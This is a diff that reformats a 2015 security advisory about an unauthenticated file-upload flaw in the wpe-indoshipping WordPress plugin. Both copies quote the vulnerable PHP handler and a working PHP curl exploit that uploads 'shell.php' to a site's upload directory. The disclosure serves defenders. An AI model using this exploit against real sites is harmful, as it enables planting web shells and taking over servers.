@@ -1,42 +1,49 @@
-                                Advisory #: 145
-Title: Remote file upload vulnerability in wpe-indoshipping v2.5.0 wordpress
-plugin [Previously Discovered]
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-07-13
-Download Site: https://wordpress.org/plugins/wpe-indoshipping
-Vendor:http://www.balitechy.com/
-Vendor Notified: 2015-07-13
-Vendor Contact: ekaputra[at]balitechy.com
-Description: Indonesian shipping special plugins to integrate with the plugin
-WP - Ecommerce. The final test at the WP - Ecommerce version 3.8.11.1 With WPE
-Indoshipping then you can display a list of postage per area in Indonesia that
-you choose . Suitable to display a list of postage from JNE , TIKI or the other
-and will directly affect the value of your order .
-Vulnerability:
-The ./wpe-indoshipping/admin/upload-file.php doesn't validate the users ability
-to upload files or the type of file being uploaded. 1 <?php 2 $upload_path =
-$_POST['upload_path']; 3 $filename = $_FILES["uploadfile"]["name"]; 4 if
-(move_uploaded_file($_FILES['uploadfile']['tmp_name'], $upload_path.$filename))
-{ 5 echo $filename; 6 } else { 7 echo 'error'; 8 } 9 ?> The attacker will need
-to guess the path to a writeable directory in the web servers root.
-CVE-
-JSON:Export
-Exploit Code:
-   1.      	<?php
-   2.  
-   3.      	$uploadfile="/var/www/shell.php";
-   4.      	$ch =
-   5.      	curl_init("http://example.com/upload-file.php");
-   6.      	curl_setopt($ch, CURLOPT_POST, true);
-   7.      	curl_setopt($ch, CURLOPT_POSTFIELDS,
-   8.      	         array('uploadfile'=>"@$uploadfile",'upload_path'=>'/usr/
-      share/wordpress/wp-content/uploads/','name'=>'shell.php'));
-   9.      	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  10.     	$postResult = curl_exec($ch);
-  11.     	curl_close($ch);
-  12.     	print "$postResult";
-  13.  
-  14.     	?>
-  15.  
-Screen Shots:
-Advisory:
+
+                               Advisory #: 145
+
+   Title: Remote file upload vulnerability in wpe-indoshipping v2.5.0
+   wordpress plugin [Previously Discovered]
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-07-13
+   Download Site: https://wordpress.org/plugins/wpe-indoshipping
+   Vendor: http://www.balitechy.com/
+   Vendor Notified: 2015-07-13
+   Vendor Contact: ekaputra[at]balitechy.com
+   Description: Indonesian shipping special plugins to integrate with the
+   plugin WP - Ecommerce. The final test at the WP - Ecommerce version
+   3.8.11.1 With WPE Indoshipping then you can display a list of postage
+   per area in Indonesia that you choose . Suitable to display a list of
+   postage from JNE , TIKI or the other and will directly affect the value
+   of your order .
+   Vulnerability:
+   The ./wpe-indoshipping/admin/upload-file.php doesn't validate the users
+   ability to upload files or the type of file being uploaded. 1 <?php 2
+   $upload_path = $_POST['upload_path']; 3 $filename =
+   $_FILES["uploadfile"]["name"]; 4 if
+   (move_uploaded_file($_FILES['uploadfile']['tmp_name'],
+   $upload_path.$filename)) { 5 echo $filename; 6 } else { 7 echo 'error';
+   8 } 9 ?> The attacker will need to guess the path to a writeable
+   directory in the web servers root.
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. <?php
+    2.
+    3. $uploadfile="/var/www/shell.php";
+    4. $ch =
+    5. curl_init("http://example.com/upload-file.php");
+    6. curl_setopt($ch, CURLOPT_POST, true);
+    7. curl_setopt($ch, CURLOPT_POSTFIELDS,
+    8. array('uploadfile'=>"@$uploadfile",'upload_path'=>'/usr/share/wordp
+       ress/wp-content/uploads/','name'=>'shell.php'));
+    9. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   10. $postResult = curl_exec($ch);
+   11. curl_close($ch);
+   12. print "$postResult";
+   13.
+   14. ?>
+   15.
+
+   Screen Shots:
+   Advisory:
